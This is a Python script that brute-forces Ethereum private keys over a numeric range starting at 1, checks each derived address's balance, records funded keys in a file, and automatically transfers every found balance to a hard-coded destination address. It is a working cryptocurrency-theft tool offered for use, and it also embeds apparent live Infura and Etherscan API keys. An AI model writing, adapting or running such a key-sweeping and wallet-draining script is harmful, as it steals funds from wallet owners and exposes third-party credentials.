from web3 import Web3
import requests
import time
from web3.middleware import geth_poa_middleware

# Configure Web3 Provider with Infura API key
infura_url = 'https://mainnet.infura.io/v3/d2859e1ca1814e45bcb523dfbb1eab38'
w3 = Web3(Web3.HTTPProvider(infura_url))

# Destination address for sending ETH
destination_address = '0x88fd1a2E86C723f522d2e47BB725b4633A12cf20'

# Add Geth POA Middleware for compatibility if needed (e.g., for Rinkeby, Kovan)
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# Function to check balance using Etherscan API
def check_balance(address, api_key):
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    data = response.json()
    balance = int(data['result'])  # Balance in Wei
    return balance

# Function to generate a wallet from a given private key
def generate_wallet_from_key(private_key_hex):
    private_key = bytes.fromhex(private_key_hex)
    account = w3.eth.account.from_key(private_key)
    return account

# Function to send ETH
def send_eth(account, balance_wei, destination_address):
    gas_estimate = 21000
    gas_price = w3.eth.gas_price
    gas_cost = gas_estimate * gas_price
    amount_to_send_wei = balance_wei - gas_cost

    if amount_to_send_wei > 0:
        tx = {
            'from': account.address,
            'to': destination_address,
            'value': amount_to_send_wei,
            'gas': gas_estimate,
            'gasPrice': gas_price,
            'nonce': w3.eth.getTransactionCount(account.address)
        }
        signed_tx = account.sign_transaction(tx)
        try:
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            print(f"Transaction sent: {tx_hash.hex()}")
            return tx_hash.hex()
        except Exception as e:
            print(f"Error sending transaction: {e}")
            return None
    else:
        print("Not enough balance to cover gas costs.")
        return None

# Main function
def main(start_key_hex, end_key_hex):
    api_key = '997YY6RK2W8Q6UZR5ERE4BQ86CAFMXTYYP'  # Etherscan API key
    start_key = int(start_key_hex, 16)
    end_key = int(end_key_hex, 16)

    # Calculate key steps to generate approximately 100k addresses
    range_size = end_key - start_key
    step_size = max(1, range_size // 100000)  # Ensure step size is at least 1

    # Ensure wallet.txt file exists
    try:
        with open('wallet.txt', 'a'):
            pass
    except Exception as e:
        print(f"Error creating wallet.txt: {e}")

    current_key = start_key
    while current_key <= end_key:
        try:
            private_key_hex = format(current_key, '064x')
            print(f"Current Key: {private_key_hex}")  # Debug output
            account = generate_wallet_from_key(private_key_hex)
            balance_wei = w3.eth.get_balance(account.address)
            balance_eth = w3.from_wei(balance_wei, 'ether')
            print(f"Checking {account.address}: Balance is {balance_eth} ETH")

            gas_cost = w3.to_wei(0.000021, 'ether')  # Reserve gas cost as fixed amount
            if balance_wei > 0:
                try:
                    with open('wallet.txt', 'a') as f:
                        f.write(f"Private Key: {private_key_hex}, Public Key: {account.address}, Balance: {balance_eth} ETH\n")
                    print(f"Found a wallet with a balance! Private Key: {private_key_hex}, Public Key: {account.address}, Balance: {balance_eth} ETH")
                except Exception as file_error:
                    print(f"Error writing to wallet.txt: {file_error}")
                
                if balance_wei > gas_cost:
                    tx_hash = send_eth(account, balance_wei, destination_address)
                    if tx_hash:
                        print(f"ETH sent successfully! Transaction hash: {tx_hash}")
                    else:
                        print("Not enough balance to send ETH after gas or an error occurred.")
                else:
                    print("Not enough balance to cover gas costs for sending ETH.")

            current_key += step_size
            time.sleep(1)  # Pause to prevent API rate limit issues

        except Exception as e:
            print(f"Error processing key {private_key_hex}: {e}")
            current_key += step_size

if __name__ == "__main__":
    start_key_hex = '0000000000000000000000000000000000000000000000000000000000000001'
    end_key_hex = '0000000000000000000000000000000000000000000000000000000000000186A0'
    main(start_key_hex, end_key_hex)
